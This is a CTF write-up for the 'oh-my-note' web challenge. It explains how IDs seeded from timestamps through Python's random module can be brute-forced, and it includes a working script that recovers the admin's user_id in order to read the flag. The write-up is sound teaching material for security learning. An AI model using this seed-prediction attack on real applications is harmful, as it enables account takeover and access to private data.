# oh-my-note-EN

First of all, get the source code, analysis of the source code that focuses on the following code

```
timestamp = round(time.time(), 4)
post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
random.seed(user_id + post_at)
note_id = get_random_id()
```

When a user sends a note for the first time, the random number seed will be set based on the current time stamp, and based on this seed to generate user_id and note_ id. The note sent by the same user generates a note_id will directly use the user_id which stored in the database as part of the seed. So we look at the notes that have been sent out and find the note that admin sent first, search the exact time stamp near the post time, and we can calculate out the admin's user_id on local, take the user_id to `/my_notes` to get flag!

This is my exp, and it maybe work for you.

```
import random
import string
import time


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)

    return ''.join([random.choice(alphabet) for _ in range(32)])


post_at = "2021-01-15 02:29 UTC"
timeArray = time.strptime(post_at, "%Y-%m-%d %H:%M UTC")
base_timestamp = int(time.mktime(timeArray) - time.mktime(time.gmtime(0)))

y = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'
flag = False

for i in range(0, 60):
    for j in range(0, 10000):
        timestamp = base_timestamp + i + round(j / 10000, 4)
        random.seed(timestamp)
        user_id = get_random_id()
        random.seed(user_id + post_at)
        note_id = get_random_id()
        if note_id == y:
            print(user_id)
            flag = True
            break
    if flag:
        break
```